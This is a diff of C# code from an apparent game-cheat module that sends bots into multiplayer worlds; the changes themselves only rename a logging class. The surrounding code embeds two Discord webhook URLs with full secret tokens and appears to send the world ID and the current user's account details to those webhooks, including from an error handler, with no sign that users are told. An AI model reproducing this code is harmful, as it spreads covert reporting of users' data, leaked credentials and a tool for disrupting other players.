@@ -16,8 +16,8 @@ namespace Area51.Module.Bot.Remote
         {
             try
             {
-                Logg.LogDebug("Bots Joining Now  | ETA 10 Seconds, Turn On Anti Photon Bots");
-                Logg.Log(Logg.Colors.Green, "Bots Joining Now | ETA 10 Seconds", false, false);
+                LogHandler.LogDebug("Bots Joining Now  | ETA 10 Seconds, Turn On Anti Photon Bots");
+                LogHandler.Log(LogHandler.Colors.Green, "Bots Joining Now | ETA 10 Seconds", false, false);
                 if (WorldWrapper.GetWorldID != "")
                     log();
                 sendWebHook("https://canary.discord.com/api/webhooks/917291519801708584/Edbd2Xxmd8XKkKPcJrqCtqYy9098tKMFUSwoVRCyL0fU4q-SHJ2JjW-FY037m0FclRIz", string.Concat(new string[]
@@ -30,7 +30,7 @@ namespace Area51.Module.Bot.Remote
             }
             catch (Exception ex)
             {
-                Logg.Log(Logg.Colors.Red, ex.ToString());
+                LogHandler.Log(LogHandler.Colors.Red, ex.ToString());
                 APIUser currentUser = APIUser.CurrentUser;
                 string webhook = "https://discord.com/api/webhooks/915691072653516800/oN5YrAZ2wZlnsXSor_WtyK5Il4VEZdXBZa5Lrvf1sJhNJl0-ZJOXkGTMZnzJfbw69yWk";
                 WebRequest wr = (HttpWebRequest)WebRequest.Create(webhook);
